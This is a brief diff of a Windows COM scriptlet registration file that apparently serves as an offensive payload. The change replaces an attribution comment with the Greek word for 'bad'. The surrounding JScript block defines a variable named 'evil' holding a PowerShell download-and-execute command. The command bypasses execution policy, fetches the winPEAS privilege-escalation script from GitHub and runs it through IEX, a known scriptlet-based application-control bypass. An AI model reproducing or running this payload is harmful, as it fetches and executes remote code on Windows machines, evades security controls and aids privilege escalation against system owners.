@@ -3,7 +3,7 @@
 <registration 
     progid="Kακός"
     classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
-	<!-- Learn from Casey Smith @subTee -->
+	<!-- Kακός -->
 	<script language="JScript">
 		<![CDATA[
 			evil="powershell -Exec ByPass -NoProfile -c "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1') | IEX";
